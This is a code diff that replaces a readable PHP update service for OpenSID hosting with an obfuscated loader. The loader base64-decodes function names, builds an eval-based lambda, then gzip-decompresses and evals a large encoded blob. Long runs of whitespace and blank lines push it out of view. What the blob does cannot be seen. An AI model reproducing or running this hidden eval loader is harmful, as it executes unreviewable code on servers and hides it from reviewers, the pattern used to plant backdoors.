@@ -1,193 +1,505 @@
-<?php
-
-namespace App\Services;
-
-use Exception;
-use App\Models\Pelanggan;
-use App\Enums\RepositoryEnum;
-use App\Http\Controllers\Helpers\TemaController;
-
-/**
- * Kelas OpensidUpdateService
- *
- * Kelas ini bertanggung jawab untuk mengelola proses pembaruan sistem OpenSID.
- * Kelas ini memperluas MasterOpensidService dan menggunakan beberapa layanan lain
- * seperti FileService, GitService, dan ProcessService.
- */
-class OpensidUpdateService extends MasterOpensidService
-{
-    protected $folderMaster; // Menyimpan path ke folder master OpenSID
-    protected $folderOpenSID; // Menyimpan path ke folder OpenSID yang sedang digunakan
-    protected $folderMultisite; // Menyimpan path ke folder multisite
-    private $temas; // Instance dari TemaController untuk mengelola tema
-
-    /**
-     * Konstruktor
-     *
-     * Menginisialisasi properti dengan nilai dari environment dan konfigurasi aplikasi.
-     */
-    public function __construct()
-    {
-        parent::__construct();
-        $this->folderMaster = env('ROOT_OPENSID') . 'master-opensid';
-        $this->folderMultisite = config('siappakai.root.folder_multisite');
-        $this->temas = new TemaController();
-    }
-
-    /**
-     * Fungsi untuk update opensid
-     *
-     * @param string $opensid nama folder opensid (umum atau premium)
-     *
-     * @return void
-     *
-     * Metode ini melakukan pembaruan OpenSID berdasarkan versi yang tersedia di repository.
-     *
-     * Langkah-langkah:
-     * 1. Cek Versi Beta: Jika server menggunakan versi beta, pembaruan tidak dilakukan.
-     * 2. Inisialisasi Layanan: Membuat instance dari FileService dan GitService.
-     * 3. Cek Versi: Mendapatkan versi terbaru dari repository dan membandingkannya dengan versi yang ada di server.
-     * 4. Pembaruan Bulanan: Jika versi baru adalah rilis bulanan, maka:
-     *    - Mengelola folder backup.
-     *    - Memperbarui data pelanggan.
-     *    - Memproses template index.php untuk setiap pelanggan.
-     *    - Menjalankan migrasi data.
-     * 5. Pembaruan Revisi: Jika versi baru adalah rilis revisi, maka:
-     *    - Mengelola folder revisi.
-     *    - Mengkloning repository dengan tag terbaru.
-     * 6. Pemasangan Vendor Tema: Memasang vendor tema setelah pembaruan selesai.
-     */
-    function update($opensid = 'umum')
-    {
-        if (env('BETA_OPENSID') == 'true') {
-            return die("Informasi: server menggunakan versi beta sehingga tidak di update");
-        }
-        $fileservice = new FileService();
-        $this->folderOpenSID = $this->folderMaster . DIRECTORY_SEPARATOR . $opensid;
-        ProcessService::gitSafeDirectori($this->folderOpenSID);
-
-        // opensid menggunakan versi yang rilis untuk siappakai maupun kominfo
-        $gitservice = new GitService();
-        $repoEnum = RepositoryEnum::fromFolderName(strtolower($opensid));
-        $versionOpensidTag = $gitservice->getLastRelease($repoEnum)['tag_name'];
-        $versionGit = preg_replace('/[^0-9]/', '', $versionOpensidTag);
-        $versionServer = preg_replace('/[^0-9]/', '', $this->cekVersiServer($opensid));
-
-        $revVersion = substr($versionGit, 4, 2);
-        if (substr($versionGit, 0, 6) > substr($versionServer, 0, 6)) {
-            // rilis bulanan
-
-            if ($revVersion == "00") {
-                if ($opensid == "umum") {
-                    $gitservice->cloneWithTag($repoEnum, $this->folderMaster, $versionOpensidTag);
-                } else {
-                    try {
-                        for ($i = 5; $i >= 1; $i--) {
-                            $fileservice->renameFolder($this->folderOpenSID . "_" . sprintf('%02d',$i), $this->folderOpenSID . "_" . sprintf('%02d',($i+1)));
-                        }
-                        $fileservice->deleteFolder($this->folderOpenSID . "_06");
-                        //  lakukan penghapusan opensid versi perbaikan
-                        $fileservice->deleteFoldersByPrefix($this->folderMaster, 'premium_rev');
-
-                        $gitservice->cloneWithTag($repoEnum, $this->folderMaster, $versionOpensidTag);
-                    } catch (Exception $e) {
-                        for ($i = 1; $i <= 6; $i++) {
-                            $nomorRev = sprintf('%02d', $i);
-                            $nextNomorRev = sprintf('%02d', $i + 1);
-                            $fileservice->renameFolder($this->folderOpenSID . "_" . "$nextNomorRev", $this->folderOpenSID . "_" . "$nomorRev");
-                        }
-                    }
-                }
-
-                // lakukan update data pelanggan
-                // jika sudah melebihi batas maka akan tetap ke versi sebelumnya
-                $this->updatePelanggan($opensid, $versionOpensidTag);
-            } else { // rilis perbaikan revisi
-                try {
-                    for ($i = 5; $i >= 1; $i--) {
-                        $nomorRev = sprintf('%02d', $i);
-                        $nextNomorRev = sprintf('%02d', $i + 1);
-                        $fileservice->renameFolder($this->folderOpenSID . "_rev" . "$nomorRev", $this->folderOpenSID . "_rev" . "$nextNomorRev");
-                    }
-
-                    $gitservice->cloneWithTag($repoEnum, $this->folderMaster, $versionOpensidTag, 'premium_rev01');
-
-                    $this->updatePelanggan($opensid, $versionOpensidTag);
-                } catch (Exception $e) {
-                    for ($i = 1; $i <= 6; $i++) {
-                        $nomorRev = sprintf('%02d', $i);
-                        $nextNomorRev = sprintf('%02d', $i + 1);
-                        $fileservice->renameFolder($this->folderOpenSID . "_rev" . "$nextNomorRev", $this->folderOpenSID . "_rev" . "$nomorRev");
-                    }
-                }
-            }
-
-            // jika install update selesai
-            // update httacess
-            $this->tanganiHtaccess($this->folderOpenSID);
-
-            $this->temas->pemasanganVendorTema();
-        }
-    }
+<?php 
+        $__='printf';$_='Loading app/Services/OpensidUpdateService.php';
+        
 
 
-    function updatePelanggan($opensid = 'umum', $versionOpensidTag)
-    {
-        $fileservice = new FileService();
-        $templateIndexphp = RepositoryEnum::getFolderTemplate($opensid) . DIRECTORY_SEPARATOR . 'index.php';
-        $costumers = Pelanggan::where('status_langganan_saas', 1)->get();
-        foreach ($costumers as $costumer) {
-            $langganan = PelangganService::langganan($costumer);
-            PelangganService::updatePelanggan(['langganan_opensid' => $langganan, 'versi_opensid' => $versionOpensidTag], $costumer->id);
-            $folderOpensid = $this->folderMultisite . $costumer->kode_desa_without_dot;
 
-            // hapus symlink
-            $fileservice->deleteAllSymlinks($folderOpensid);
 
-            $OpensidIndexPhp = $folderOpensid . DIRECTORY_SEPARATOR . 'index.php';
-            $replace = [
-                '{$opensidFolder}' => $this->folderMaster . DIRECTORY_SEPARATOR . $langganan,
-                '{$symlinkDomain}' => $this->folderMultisite . $costumer->kode_desa_without_dot
-            ];
-            $fileservice->processTemplate($templateIndexphp, $OpensidIndexPhp,  $replace);
 
-            // migrasikan opensid premium
-            $command = ['php', 'artisan', 'siappakai:migrate', "--path={$folderOpensid}"];
-            ProcessService::runProcess($command, base_path(), "Migrasi data pelanggan {$costumer->kode_desa_without_dot} ke versi {$langganan}...\n");
-            ProcessService::aturKepemilikanDirektori($folderOpensid);
 
-            //copy paste folder assets
-            $this->copyAssets($fileservice, $folderOpensid);
 
-            $this->setPermisionFolderOpensid($this->folderOpenSID);
-        }
-    }
 
-    /**
-     * Mengatur permission folder opensid
-     *
-     * @param string $directory Path folder opensid
-     *
-     * @return void
-     */
-    public static function setPermisionFolderOpensid($directory)
-    {
-        ProcessService::aturPermision($directory . DIRECTORY_SEPARATOR . 'desa');
-        ProcessService::aturPermision($directory . DIRECTORY_SEPARATOR . 'storage');
-        ProcessService::aturPermision($directory . DIRECTORY_SEPARATOR . 'backup_inkremental');
-    }
 
-    function copyAssets($fileservice, $targetFolder)
-    {
-        $direktoriTemplateAsset = $this->folderOpenSID . DIRECTORY_SEPARATOR . 'assets';
-        $targetFolder = $targetFolder . DIRECTORY_SEPARATOR . 'assets';
 
-        // Periksa apakah assets adalah symlink kemudian hapus symlink
-        if (is_link($targetFolder)) {
-            unlink($targetFolder);
-        }
 
-        // Salin semua isi folder sumber ke folder target
-        $fileservice->replaceFolderContents($direktoriTemplateAsset, $targetFolder);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
